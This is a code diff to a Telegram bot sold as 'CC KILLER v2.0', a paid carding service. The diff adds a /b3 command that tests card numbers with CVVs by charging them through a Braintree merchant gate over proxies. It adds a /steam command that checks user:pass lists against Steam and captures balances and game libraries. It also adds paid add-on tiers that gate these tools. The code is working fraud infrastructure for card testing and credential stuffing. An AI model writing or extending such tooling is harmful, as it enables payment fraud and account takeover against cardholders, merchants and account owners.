@@ -2,7 +2,7 @@ import asyncio
 import os
 from pyrogram import Client, filters, enums
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG, add_hitter_url, remove_hitter_url, get_hitter_urls, load_hitter_urls
+from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG, add_hitter_url, remove_hitter_url, get_hitter_urls, load_hitter_urls, has_feature_access, grant_feature, revoke_feature
 from security import authorized_filter, check_flood
 import time
 from tokenizer import extract_cards
@@ -11,6 +11,8 @@ from stlear_killer import steal_cc_killer
 from bin_detector import get_bin_info
 from generator import generate_cards
 from database import db
+from gates import check_braintree_rotometals
+from steam_gate import check_steam_account
 
 # Session persistence - prevents FloodWait on every deploy
 SESSION_STRING = os.getenv("SESSION_STRING", "")
@@ -102,7 +104,9 @@ async def start_cmd(client, message):
     
     # Check for referral deep link (e.g. /start ref_ABCD1234)
     referral_code = None
-    if len(message.command) > 1 and message.command[1].startswith("ref_"):
+    # Check for referral deep link (e.g. /start ref_ABCD1234)
+    referral_code = None
+    if message.command and len(message.command) > 1 and message.command[1].startswith("ref_"):
         referral_code = message.command[1].replace("ref_", "").upper()
         
         # Check if user is already registered
@@ -123,11 +127,16 @@ async def start_cmd(client, message):
                     f"🎁 Your referrer got +10 credits too!"
                 )
 
+    await show_main_menu(client, message, user_id, is_edit=False)
+
+async def show_main_menu(client, message, user_id, is_edit=False):
+    """Refactored Main Menu Display"""
     data = get_user_data(user_id)
     
     # Get DB user data for accurate credits
     db_user = await db.get_user(user_id)
     credits_display = 'UNLIMITED' if data.get('is_vip') else (db_user.get('credits', data.get('credits', 0)) if db_user else data.get('credits', 0))
+    plan_display = db_user.get('plan', 'FREE') if db_user else data.get('plan', 'FREE')
     
     welcome_text = f"""
 💀 <b>WELCOME TO CC KILLER v2.0</b> 💀
@@ -137,8 +146,8 @@ async def start_cmd(client, message):
 📌 <b>USER INFO:</b>
 • ID: <code>{user_id}</code>
 • Credits: <b>{credits_display}</b>
-• Plan: <b>{data['plan']}</b>
-{f"• Expiry: <code>{data['expiry']}</code>" if data.get('expiry') else ""}
+• Plan: <b>{plan_display}</b>
+{f"• Expiry: <code>{data.get('expiry')}</code>" if data.get('expiry') else ""}
 
 🚀 <b>SPEED:</b> 0.3s/card | 150+ Parallel
 🛡️ <b>SECURITY:</b> Proxy Bound & Anti-Flood
@@ -174,11 +183,31 @@ async def start_cmd(client, message):
         ]
     ])
     
-    photo_path = get_asset_path(WELCOME_PHOTO_URL)
-    if photo_path:
-        await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
+    if is_edit:
+        # If the original message has media, and we want to change text, edit_caption is safer if we keep media
+        # Or we can delete and send new if types don't match.
+        # Simplest 'Back' behavior is often treating it like a new menu or editing text if no photo change needed.
+        # But Welcome has a photo.
+        try:
+             await message.edit_caption(caption=welcome_text, reply_markup=keyboard)
+        except:
+             # If it fails (e.g. was text message), try edit_text
+             try:
+                 await message.edit_text(text=welcome_text, reply_markup=keyboard)
+             except:
+                 # Fallback: Delete and resend (if media type mismatch)
+                  await message.delete()
+                  photo_path = get_asset_path(WELCOME_PHOTO_URL)
+                  if photo_path:
+                      await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
+                  else:
+                      await message.reply_text(welcome_text, reply_markup=keyboard)
     else:
-        await message.reply_text(welcome_text, reply_markup=keyboard)
+        photo_path = get_asset_path(WELCOME_PHOTO_URL)
+        if photo_path:
+            await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
+        else:
+            await message.reply_text(welcome_text, reply_markup=keyboard)
 
 @app.on_callback_query()
 async def handle_callbacks(client, callback_query):
@@ -331,23 +360,29 @@ async def handle_callbacks(client, callback_query):
 🔰 <b>BASIC PLAN</b>
 • Credits: 100
 • Price: $5
-• Access: All Gates
+• Access: Standard Gates
 
 🚀 <b>STANDARD PLAN</b>
 • Credits: 500
 • Price: $20
-• Access: All Gates + Priority
+• Access: Standard Gates + Priority
 
 👑 <b>ULTIMATE PLAN</b> (Recommended 🔥)
 • Credits: 2000
 • Price: $50
-• Access: All Gates + Priority
+• Access: All Standard Gates
 
 🛡️ <b>VIP PLAN</b>
 • Credits: <b>UNLIMITED</b>
 • Price: $100
-• Access: VIP Gates + Support
+• Access: VIP Gates
 • Validity: 30 Days
+
+🌟 <b>PREMIUM ADD-ONS (Pay Extra)</b>
+• 🎮 Steam Checker: +$10
+• 💳 B3 Charge ($54): +$15
+• 🔷 Mass Razorpay: +$10
+<i>(Contact Support to buy Add-ons)</i>
 
 💳 <b>PAYMENT METHODS:</b>
 • UPI ID: <code>{UPI_ID}</code>
@@ -578,6 +613,12 @@ async def handle_callbacks(client, callback_query):
         check_type = pending_data["type"]
         original_msg = pending_data["message"]
         
+        # RESTRICTION: Mass Razorpay
+        if "razorpay" in gate_key.lower():
+            if not has_feature_access(user_id, "mass_razorpay"):
+                 await callback_query.answer("❌ RESTRICTED: Buy 'Mass Razorpay' Add-on to use this gate!", show_alert=True)
+                 return
+
         if not update_user_credits(user_id, -5):
             await callback_query.answer("❌ Insufficient credits!")
             return
@@ -742,7 +783,69 @@ async def handle_callbacks(client, callback_query):
 
     elif data == "back_start":
         await callback_query.answer()
-        await start_cmd(client, callback_query.message)
+        await show_main_menu(client, callback_query.message, user_id, is_edit=True)
+
+@app.on_message(filters.command(["b3"]))
+async def b3_charge_cmd(client, message):
+    text, error = await get_text_from_message(client, message)
+    if error:
+        await message.reply(error)
+        return
+
+    if not text:
+        await message.reply("<b>Usage:</b> /b3 cc|mm|yy|cvv")
+        return
+
+    cards = extract_cards(text)
+    if not cards:
+        await message.reply("❌ No valid cards found.")
+        return
+
+    if len(cards) > 1:
+        await message.reply("❌ Please check 1 card at a time with this command.")
+        return
+
+    card = cards[0]
+    cc, mm, yy, cvv = card
+    
+    user_id = message.from_user.id
+    
+    # RESTRICTION: B3 Charge
+    if not has_feature_access(user_id, "b3"):
+        await message.reply("❌ <b>ACCESS DENIED</b>\nThis command (B3 Charge) is a <b>Premium Add-on</b>.\nPlease contact admin to purchase access.")
+        return
+
+    if not update_user_credits(user_id, -1):
+        await message.reply("❌ Insufficient credits!")
+        return
+
+    msg = await message.reply(f"<b>Checking {cc[:12]}xxxx...</b>\nGate: B3 Charge $54 (Braintree)")
+    
+    start = time.time()
+    from config import get_proxy
+    proxy = get_proxy()
+    
+    result = await check_braintree_rotometals(cc, mm, yy, cvv, proxy)
+    end = time.time()
+    
+    # Format Response
+    status = result.get("status", "unknown").upper()
+    response = result.get("response", "No response")
+    
+    final_text = f"""
+<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Card >_</b> <code>{cc}|{mm}|{yy}|{cvv}</code>
+<b>$Status:</b> {status}
+<b>Response >_</b> {response}
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Gate >_</b> B3 Charge $54
+<b>$Proxy:</b> {proxy if proxy else 'Local'}
+<b>Time:</b> {end - start:.2f}s
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>#Developer >_</b> {DEVELOPER_NAME}
+"""
+    await msg.edit(final_text)
 
 def get_gate_function(gate_key: str, check_type: str):
     """Returns the appropriate gate function based on gate key and check type."""
@@ -780,6 +883,63 @@ def get_gate_function(gate_key: str, check_type: str):
         }
     
     return gate_map.get(gate_key, check_stripe)
+
+@app.on_message(filters.command(["steam"]))
+async def steam_cmd(client, message):
+    text, error = await get_text_from_message(client, message)
+    if error:
+        await message.reply(error)
+        return
+
+    if not text or ":" not in text:
+        await message.reply("<b>Usage:</b> /steam user:pass")
+        return
+
+    # Support multiple lines: user:pass\nuser:pass
+    accounts = [line.strip() for line in text.splitlines() if ":" in line]
+    
+    if not accounts:
+        await message.reply("❌ No valid accounts found.")
+        return
+        
+    user_id = message.from_user.id
+    # RESTRICTION: Steam
+    if not has_feature_access(user_id, "steam"):
+         await message.reply("❌ <b>ACCESS DENIED</b>\nThis command (Steam Checker) is a <b>Premium Add-on</b>.\nPlease contact admin to purchase access.")
+         return
+
+    msg = await message.reply(f"<b>Checking {len(accounts)} Steam Account(s)...</b>")
+    
+    results_text = f"<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 🎮]</b>\n"
+
+    for acc in accounts:
+        parts = acc.split(":", 1)
+        if len(parts) != 2: continue
+        user, password = parts
+        
+        start = time.time()
+        result = await check_steam_account(user, password)
+        end = time.time()
+        
+        status_emoji = "✅" if result.get("status") == "success" else "❌"
+        
+        results_text += f"- ━━━━━━━━━━━━━━━━━━━━━━ -\n"
+        results_text += f"<b>Account >_</b> <code>{user}</code>\n"
+        results_text += f"<b>Status:</b> {result.get('response')} {status_emoji}\n"
+        
+        if result.get("status") == "success":
+            cap = result.get("capture", {})
+            results_text += f"<b>Balance:</b> {cap.get('Balance')}\n"
+            results_text += f"<b>Country:</b> {cap.get('Country')}\n"
+            results_text += f"<b>Games:</b> {cap.get('TotalGames')} ({', '.join(cap.get('GamesList', []))})\n"
+            results_text += f"<b>Limit:</b> {cap.get('Limited')}\n"
+            results_text += f"<b>VAC:</b> {', '.join(cap.get('VAC', [])) or 'None'}\n"
+        
+        results_text += f"<b>Time:</b> {end - start:.2f}s\n"
+
+    results_text += f"- ━━━━━━━━━━━━━━━━━━━━━━ -\n<b>#Developer >_</b> {DEVELOPER_NAME}"
+    
+    await msg.edit(results_text)
 
 # ========== AUTOHITTER MESSAGE HANDLER ==========
 @app.on_message(filters.text & authorized_filter & ~filters.command(["chk", "mchk", "kl", "gen", "start", "help", "addsite", "addurl", "listsites", "setproxy", "addproxy", "viewproxy", "myproxy", "listproxy", "plans", "addcredit", "setvip", "cancel"]))
